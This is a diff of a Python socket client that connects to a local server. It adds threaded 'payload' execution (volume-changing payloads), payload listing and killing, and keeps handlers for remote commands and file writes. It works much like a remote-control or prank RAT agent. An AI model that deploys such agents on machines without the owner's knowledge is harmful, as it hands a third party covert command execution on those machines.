@@ -1,17 +1,50 @@
+from threading import Thread
 from socketHelpers.client import Client
 from socketHelpers.packet import Packet
 
 import os
-
+import time
 
 import payloads.test
+import payloads.minvolume
+import payloads.maxvolume
 
-paylds = [payloads.test]
-PAYLOADS = {x.__name__:x for x in paylds}
+paylds = [payloads.test, payloads.minvolume, payloads.maxvolume]
+PAYLOADS = {str(x.__name__).split(".")[1]:x for x in paylds}
+
+
+class PayloadPlayer(Thread):
+    def __init__(self, payload, manager=None):
+        super().__init__()
+        self.payload = payload
+        self.running = False
+        self.manager = manager
+        self.starttime = 0
+
+    def __repr__(self):
+        t = time.strftime("%j %H:%M:%S", time.gmtime( time.time() - (time.time() if self.starttime == 0 else self.starttime) )).split(" ")
+        return "PayloadPlayer(%s, %s days %s)"%(self.payload.__name__, int(t[0])-1, t[1])
+
+    def run(self):
+        self.starttime = time.time()
+        self.running = True
+        if self.manager : self.manager.activePayloads[self.payload.__name__.split(".")[1]] = self
+        self.payload.execute(self)
+        self.running = False
+
+    def kill(self):
+        self.running = False
+
+    def execute(self):
+        if self.payload.RETURNS: return self.payload.execute(self)
+        self.start()
+
+        return "Started execution of '%s'."%self.payload
 
 
 
 class Client(Client):
+    activePayloads = {}
     file_buffer = ""
 
     def handle(self, packet):
@@ -19,8 +52,12 @@ class Client(Client):
             self.send(Packet("execute", str(list(PAYLOADS.keys()))))
 
         if packet.get_id() == "execute":
-            data = PAYLOADS[packet.read()].execute()
-            self.send(Packet("info", data))
+            try:
+                data = PayloadPlayer(PAYLOADS[packet.read()], self).execute()
+            except KeyError:
+                self.send(Packet("info", "Can not find payload %s."%packet.read()))
+            else:
+                self.send(Packet("info", data))
 
         if packet.get_id() == "cmd":
             try:
@@ -47,7 +84,20 @@ class Client(Client):
                 f.write(data)
                 f.close()
 
+        if packet.get_id() == "cleaner":
+            for i in self.activePayloads:
+                activePayloads[i].kill()
 
+        if packet.get_id() == "active":
+            self.send(Packet("active", str(self.activePayloads)))
+
+        if packet.get_id() == "paykill":
+            try:
+                self.activePayloads[packet.read()].kill()
+            except KeyError:
+                self.send(Packet("info", "Can not find payload %s."%packet.read()))
+            else:
+                self.send(Packet("info", "Killed payload."))
 
 
 c = Client("localhost", 2000)
